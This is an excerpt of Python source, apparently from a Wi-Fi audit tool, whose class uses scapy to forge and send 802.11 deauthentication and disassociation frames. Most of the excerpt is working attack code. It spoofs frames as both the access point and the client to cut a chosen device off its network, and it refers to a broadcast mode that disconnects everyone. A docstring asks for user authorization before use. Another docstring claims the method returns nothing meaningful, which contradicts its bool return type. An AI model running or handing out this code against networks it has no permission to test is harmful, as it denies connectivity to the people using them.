...
class WirelessAuditEngine:
    ...
    # IEEE 802.11 reason codes (Table 9-49, common subset).
    # Full spec goes to 65535, but these 1-9 cover every practical audit need.
    DEAUTH_REASONS = {
        1: "Unspecified",
        2: "Previous auth no longer valid",
        3: "Station leaving IBSS/ESS",
        ...
        9: "Association denied / not authenticated",
    }

    @classmethod
    def reason_name(cls, code: int) -> str:
        try:
            return cls.DEAUTH_REASONS.get(int(code), f"Reason {code}")
        except Exception:
            return f"Reason {code}"

    @staticmethod
    def _coerce_reason(reason, is_disassoc: bool) -> int:
        """Validate reason code. None -> 7 (deauth) / 8 (disassoc) default.
        Accepts 0-65535 (spec range); falls back to default on garbage."""
        default = 8 if is_disassoc else 7
        if reason is None:
            return default
        try:
            r = int(reason)
    ...
    def deauth_frame(self, iface: str, transmitter_mac: str, receiver_mac: str,
                     mgmt_subtype: int = 12, reason: int | None = None) -> bool:
        ...
        10 = Disassociation. `reason` = 802.11 reason code (1-9 common,
        0-65535 spec range); None = 7 for deauth / 8 for disassoc.
        Returns nothing meaningful (kept for compatibility)."""
        ...
        reason = self._coerce_reason(reason, is_disassoc)
        ...
        packet = (
            ...
            (Dot11Disas(reason=reason) if is_disassoc else Dot11Deauth(reason=reason))
        )
        ...
        try:
            key = (str(transmitter_mac), str(receiver_mac), mgmt_subtype, reason)
            ...
            if self._can_render("deauth"):
                ...
                print(
                    ...
                    f"R{reason} Count {UI.GREEN}{count}{UI.RESET}  ",
                    end="",
                    flush=True,
                )
        except Exception:
    ...
    def deauth_unicast(self, iface: str, ap_bssid: str, client_mac: str,
                       mgmt_subtype: int = 12, reason: int | None = None) -> bool:
        """Send a bidirectional unicast disruption pair (ACTIVE — call only
        after explicit user authorization).

        Proper unicast deauth/disassoc must hit BOTH sides of the
        association, because either side may ignore a one-sided spoof:

          1. AP -> client   (addr1=client, addr2=AP, addr3=AP/BSSID)
          2. Client -> AP   (addr1=AP, addr2=client, addr3=AP/BSSID)

        Note addr3 is ALWAYS the BSSID (the AP MAC) in both directions —
        this is what the old single-frame path got wrong for the
        client->AP direction.

        Args:
            iface: monitor-mode interface to transmit on.
            ap_bssid: target AP BSSID (also used as addr3 for both frames).
            client_mac: target client MAC.
            mgmt_subtype: 12 = Deauthentication (default),
                10 = Disassociation.
            reason: 802.11 reason code (1-9 common, 0-65535 spec range);
                None = 7 for deauth / 8 for disassoc.

        Returns:
            True if both frames were sent, False on validation/send error.
        """
        import re as _re
        from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, sendp
        ...
        ap = str(ap_bssid or "").strip()
        cli = str(client_mac or "").strip()
        if not _re.match(_mac_re, ap):
            try:
                UI.warn(f"Invalid AP BSSID '{ap_bssid}' — unicast frame aborted.")
            except Exception:
                pass
            return False
        if not _re.match(_mac_re, cli):
            try:
                UI.warn(f"Invalid client MAC '{client_mac}' — unicast frame aborted.")
            except Exception:
                pass
            return False
        if ap.lower() == cli.lower():
            try:
                UI.warn("AP and client MAC are identical — unicast frame aborted.")
            except Exception:
                pass
            return False
        # Refuse broadcast here — broadcast has its own path (deauth_frame
        # with ff:ff:ff:ff:ff:ff). Sending broadcast via unicast would
        # deauth everyone, which is never what a unicast request means.
        if cli.lower() == "ff:ff:ff:ff:ff:ff":
            try:
                UI.warn("Refusing broadcast MAC in unicast mode — use Broadcast mode instead.")
            except Exception:
                pass
            return False

        def _build(addr1: str, addr2: str):
            return (
                RadioTap() /
                Dot11(
                    type=0,
                    ...
                    addr1=addr1,
                    addr2=addr2,
                    addr3=ap,  # BSSID always
                ) /
                (Dot11Disas(reason=reason) if is_disassoc else Dot11Deauth(reason=reason))
            )

        # Direction 1: AP -> client (spoofed as the AP).
        pkt_ap_to_cli = _build(cli, ap)
        # Direction 2: Client -> AP (spoofed as the client).
        pkt_cli_to_ap = _build(ap, cli)

        try:
            # sendp with a list transmits both frames back-to-back.
            sendp([pkt_ap_to_cli, pkt_cli_to_ap], iface=iface,
                  inter=0.02, count=1, verbose=0)
        except Exception as e:
            try:
                UI.warn(f"Unicast {('disassoc' if is_disassoc else 'deauth')} send failed: {e}")
            except Exception:
                pass
            return False

        # Single-line live counter (counts PAIRS as 2 frames).
        try:
            key = (ap.lower(), cli.lower(), mgmt_subtype, reason)
            with self._deauth_lock:
                count = self._deauth_counts.get(key, 0) + 2
                self._deauth_counts[key] = count
            if self._can_render("deauth"):
                tag = "DISASSOC" if is_disassoc else "DEAUTH"
                print(
                    f"\r  {UI.RED}[{tag}-UNI]{UI.RESET} "
                    f"{UI.CYAN}{ap}{UI.RESET} <-> "
                    f"{UI.YELLOW}{cli}{UI.RESET} - "
                    f"R{reason} Count {UI.GREEN}{count}{UI.RESET}  ",
                    end="",
                    flush=True,
                )
